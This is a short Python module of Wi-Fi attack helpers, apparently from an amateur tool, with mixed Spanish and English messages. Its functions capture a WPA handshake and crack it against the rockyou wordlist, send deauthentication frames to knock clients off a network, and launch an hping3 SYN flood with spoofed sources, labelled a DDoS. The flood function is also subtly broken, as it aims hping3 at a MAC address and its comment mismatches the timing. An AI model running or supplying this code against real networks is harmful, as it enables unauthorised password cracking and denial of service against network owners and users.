# attack_utils.py
import subprocess
import time
import os
import glob

def capture_handshake(interface, bssid, channel):
    """Capture WPA handshake for a specific network"""
    try:
        capture_file = f"capture-{bssid.replace(':', '')}"
        cmd = f"airodump-ng --bssid {bssid} -c {channel} -w {capture_file} {interface}"
        process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        time.sleep(30)  # Capture for 30 seconds
        process.terminate()
        
        # Attempt to crack the captured handshake
        cap_file = f"{capture_file}-01.cap"
        cmd = f"aircrack-ng {cap_file} -w /home/kali/Downloads/rockyou.txt"
        output = subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT).decode()
        
        # Clean up capture files
        for f in glob.glob(f"{capture_file}*"):
            os.remove(f)
            
        return output
    except Exception as e:
        raise Exception(f"Error al capturar handshake: {str(e)}")

def deauth_attack(interface, bssid):
    """Perform deauth attack on a specific network"""
    try:
        cmd = f"aireplay-ng --deauth 10 -a {bssid} {interface}"
        output = subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT).decode()
        return output
    except Exception as e:
        raise Exception(f"Error performing deauth attack: {str(e)}")

def ddos_attack(interface, bssid, packets=10000):
    """Perform DDoS attack on a specific network"""
    try:
        cmd = f"hping3 -c {packets} -d 120 -S -w 64 -p 80 --flood --rand-source {bssid}"
        process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(20)  # Run for 10 seconds
        process.terminate()
        return "Ataque DDoS completado"
    except Exception as e:
        raise Exception(f"Error durante el ataque DDoS: {str(e)}")